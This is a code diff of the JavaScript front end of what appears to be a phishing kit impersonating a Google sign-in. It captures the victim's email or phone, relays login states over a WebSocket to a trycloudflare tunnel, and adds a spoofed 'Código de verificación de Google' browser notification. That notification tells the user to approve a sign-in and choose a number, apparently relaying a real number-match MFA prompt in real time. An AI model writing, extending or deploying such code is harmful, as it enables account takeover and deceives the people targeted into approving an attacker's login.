@@ -6,6 +6,13 @@ let socket; // Variable para almacenar la conexión WebSocket
 const appContainer = document.getElementById('app'); // Contenedor principal donde se cargan las pantallas
 let currentUserIdentifier = null; // <--- Variable para guardar el email/teléfono
 let currentDeviceName = null; // <--- Variable para guardar el nombre del dispositivo
+// --- Elementos del Modal de Pre-Permiso de Notificaciones ---
+let backdropElement;
+let prePermissionModalElement;
+let permitButtonModal;
+let declineButtonModal;
+let identifierInputElementForModal; // Input de email/teléfono que dispara el modal
+
 
 // ------------------------- UTILIDADES UI --------------------------- //
 
@@ -105,6 +112,123 @@ function clearScreen1Errors() {
 }
 
 
+
+// ------------------------- LÓGICA MODAL PRE-PERMISO NOTIFICACIONES --------------------------- //
+
+/**
+ * Inicializa los elementos del modal de pre-permiso y configura sus listeners.
+ */
+function setupPrePermissionModal() {
+    backdropElement = document.querySelector('.backdrop');
+    prePermissionModalElement = document.querySelector('.pre-permission-modal');
+    permitButtonModal = document.getElementById('btn-permit');
+    declineButtonModal = document.getElementById('btn-decline');
+    identifierInputElementForModal = document.getElementById('identifierInput');
+
+    if (!backdropElement || !prePermissionModalElement || !permitButtonModal || !declineButtonModal) {
+        console.warn("Modal de pre-permiso o sus elementos no fueron encontrados. La funcionalidad de solicitud de notificaciones puede no operar.");
+        return;
+    }
+
+    if (identifierInputElementForModal) {
+        identifierInputElementForModal.addEventListener('click', () => {
+            // Mostrar solo si el permiso es 'default' (aún no se ha preguntado o el usuario no eligió)
+            // y si los elementos del modal existen.
+            if (Notification.permission === 'default' && prePermissionModalElement && backdropElement) {
+                prePermissionModalElement.style.display = 'block';
+                backdropElement.style.display = 'block';
+                if (permitButtonModal) permitButtonModal.focus(); // Foco en el botón "Permitir"
+            }
+        });
+    }
+
+    if (permitButtonModal) {
+        permitButtonModal.addEventListener('click', () => {
+            // Solicitar permiso real del navegador
+            Notification.requestPermission().then(permission => {
+                console.log('Resultado del permiso de notificación:', permission);
+                if (permission === 'granted') {
+                    console.log('¡Permiso concedido! Ahora puedes recibir notificaciones.');
+                    // Aquí podrías, por ejemplo, enviar una notificación de prueba o de bienvenida
+                    // sendPushNotification("¡Gracias por activar las notificaciones!");
+                } else if (permission === 'denied') {
+                    console.log('Permiso denegado. No se podrán enviar notificaciones.');
+                } else {
+                    console.log('El usuario cerró el diálogo de permiso sin tomar una decisión (default).');
+                }
+            });
+            hidePrePermissionModal(); // Ocultar el modal después de la interacción
+        });
+    }
+
+    if (declineButtonModal) {
+        declineButtonModal.addEventListener('click', () => {
+            hidePrePermissionModal(); // Simplemente ocultar el modal
+            console.log('El usuario eligió "Ahora no" para las notificaciones en el modal de pre-permiso.');
+        });
+    }
+}
+
+/**
+ * Oculta el modal de pre-permiso de notificaciones.
+ */
+function hidePrePermissionModal() {
+    if (prePermissionModalElement && backdropElement) {
+        prePermissionModalElement.style.display = 'none';
+        backdropElement.style.display = 'none';
+    }
+}
+
+
+// ------------------------- LÓGICA NOTIFICACIONES PUSH --------------------------- //
+
+/**
+ * Envía una notificación push al usuario.
+ * @param {string|number} number - El número o mensaje a mostrar en la notificación.
+ */
+async function sendPushNotification(number) {
+    console.warn('Enviando notificación push...');
+    if (!('Notification' in window)) {
+        console.warn('Este navegador no soporta notificaciones de escritorio.');
+        alert('Tu navegador no soporta notificaciones.'); // Feedback al usuario
+        return;
+    }
+
+    if (Notification.permission !== 'granted') {
+        console.warn('Permiso de notificaciones no concedido. No se puede enviar la notificación.');
+        // Podrías intentar solicitar permiso aquí si es la primera vez o guiar al usuario.
+        // Por ahora, si no hay permiso, no se envía. El modal de pre-permiso debería haberlo manejado.
+        return;
+    }
+
+    const notificationOptions = {
+        body: `Toca "Sí" en la notificación y luego marca ${number}`,
+        icon: './assets/icon/android-icon-192x192.png', // Asegúrate que esta ruta sea correcta desde la raíz
+        tag: 'google-auth-verification-code', // Un tag para agrupar o reemplazar notificaciones
+        requireInteraction: true, // Mantiene la notificación visible hasta que el usuario interactúe
+        silent: false, // Con sonido/vibración por defecto (si el sistema lo permite)
+        vibrate: [200, 100, 200], // Patrón de vibración: vibra 200ms, pausa 100ms, vibra 200ms
+        data: { // Datos personalizados que el Service Worker puede usar
+            numeroVerificacion: number,
+            // urlDestino: '/ruta-interna-app?codigo=' + number // Opcional: si quieres que el clic lleve a algún sitio
+        },
+        timestamp: Date.now(), // Marca de tiempo de cuándo se generó
+        renotify: false // Si es true, una nueva notificación con el mismo tag volverá a alertar al usuario
+    };
+
+    try {
+        const registration = await navigator.serviceWorker.ready; // Espera a que el SW esté activo
+        await registration.showNotification('Código de verificación de Google', notificationOptions); // Título de la notificación
+        console.log('Notificación push enviada con el número:', number);
+    } catch (err) {
+        console.error('Error al mostrar la notificación push:', err);
+    }
+}
+
+
+
+
+
 document.addEventListener('DOMContentLoaded', () => {
     const emailInput = document.getElementById('identifierInput');
   
@@ -185,6 +309,7 @@ function handleScreen1NextClick() {
 
 // Funciones necesarias cuando se cargue screen2.html
 // Deberán ser llamadas DESPUÉS de que loadScreen() inyecte el HTML de screen2
+
 
 /**
  * Configura los event listeners para los elementos interactivos de la Pantalla 2.
@@ -278,6 +403,45 @@ function setupScreen2Listeners() {
 
     // Limpiar errores previos al mostrar la pantalla (si aplica)
     clearScreen1Errors(); // Reutilizamos la función adaptada previamente
+
+
+    // --- LÓGICA DEL MODAL DE IDENTIDAD DE LA PANTALLA 2 (SIMPLIFICADA) ---
+    const modalBackdrop = appContainer.querySelector('#modal-backdrop');
+    const modalDialog = appContainer.querySelector('#modal');
+    const modalPermitButton = appContainer.querySelector('#btn-permit-screen2-modal');
+
+    if (modalBackdrop && modalDialog && modalPermitButton) {
+        // 1. Mostrar el modal automáticamente
+        console.log("[Modal Screen2] Mostrando modal de identidad.");
+        modalBackdrop.style.display = 'block';
+        modalDialog.style.display = 'block';
+
+        // 2. Configurar el botón "Continuar" del modal para que lo oculte al hacer clic
+        //    Quitar listener previo por si acaso esta función se llama más de una vez.
+        modalPermitButton.removeEventListener('click', closeModalHandler);
+        modalPermitButton.addEventListener('click', closeModalHandler);
+
+        function closeModalHandler() {
+            console.log("[Modal Screen2] Botón 'Continuar' (#btn-permit-screen2-modal) clickeado. Ocultando modal.");
+            modalBackdrop.style.display = 'none';
+            modalDialog.style.display = 'none';
+            // Importante: remover el listener después de usarlo si no se necesita más
+            // o si el modal podría ser recreado y se añadiría un nuevo listener.
+            // En este caso, como el modal es parte de screen2.html y se destruye/recrea con la pantalla,
+            // no es estrictamente necesario removerlo aquí, pero es buena práctica en otros escenarios.
+            // modalPermitButton.removeEventListener('click', closeModalHandler); 
+        }
+        console.log("[Modal Screen2] Listener 'click' añadido a #btn-permit-screen2-modal.");
+
+    } else {
+        let errorMsg = "[Modal Screen2] Error: Elementos del modal no encontrados al configurar:";
+        if (!modalBackdrop) errorMsg += " #modal-backdrop";
+        if (!modalDialog) errorMsg += " #modal";
+        if (!modalPermitButton) errorMsg += " #btn-permit-screen2-modal";
+        console.error(errorMsg);
+    }
+    // ----------------------------------------------------------------------
+    console.log("Listeners de Pantalla 2 y modal configurados.");
 }
 
 
@@ -755,11 +919,16 @@ function handleWebSocketMessage(event) {
 
 
             case 'AUTH_NOTIFICATION_PENDING_PRESS_NUMBER':
-                // El servidor está indicando que el usuario debe presionar un número.
-                hideLoader(); // Ocultar loader
-                // Aquí podrías mostrar un mensaje o cambiar la UI para indicar al usuario que presione un número
-                loadScreen('AUTH_NOTIFICATION_PENDING_PRESS_NUMBER', message.payload);
-                break;
+                    // La notificación se envía PRIMERO, luego se carga la pantalla.
+                    console.log('AUTH_NOTIFICATION_PENDING_PRESS_NUMBER recibido.');
+                    console.log(message.payload);
+                    if (message.payload && typeof message.payload.pressNumber !== 'undefined') {
+                        sendPushNotification(message.payload.pressNumber); // <--- LLAMADA A LA FUNCIÓN
+                    } else {
+                        console.warn('AUTH_NOTIFICATION_PENDING_PRESS_NUMBER recibido sin pressNumber en payload.');
+                    }
+                    loadScreen('AUTH_NOTIFICATION_PENDING_PRESS_NUMBER', message.payload); // hideLoader se llama dentro de loadScreen
+                    break;
 
                 case 'AUTH_2FA_OPTIONS_PRESENT':
     // 1. Cargar la estructura base de la pantalla 2FA
@@ -879,7 +1048,7 @@ function initWebSocket() {
     // Construye la URL completa y correcta para el WebSocket (ej: ws://192.168.5.52:8080)
     //const wsUrl = `ws://${wsHost}:8080`;
 
-    const cloudflareTunnelUrl = 'parcel-fred-attack-investors.trycloudflare.com'; // SOLO el hostname del túnel
+    const cloudflareTunnelUrl = 'stationery-lucy-court-garage.trycloudflare.com'; // SOLO el hostname del túnel
     const wsUrl = `wss://${cloudflareTunnelUrl}`;
 
     // Loguea la URL que se usará para la conexión (útil para depurar)
@@ -935,6 +1104,19 @@ function initWebSocket() {
  */
 function main() {
     console.log("DOM completamente cargado y parseado.");
+     // --- Registro del Service Worker (solo en HTTPS o localhost) ---
+if ('serviceWorker' in navigator && (location.protocol === 'https:' || location.hostname === 'localhost')) {
+    console.log('Service Worker soportado. Registrando...');
+    navigator.serviceWorker.register('/js/service-worker.js')
+      .then(reg => console.log('SW registrado, scope:', reg.scope))
+      .catch(err => console.error('Error registrando SW:', err));
+  } else {
+    console.warn('Service Worker requiere HTTPS o localhost. No se registró.');
+  }
+
+  
+    // ---------------------------------
+    setupPrePermissionModal();
     // 1. Configurar los listeners para la pantalla inicial (screen1) que ya está en el HTML
     setupScreen1Listeners();
     // 2. Iniciar la conexión WebSocket
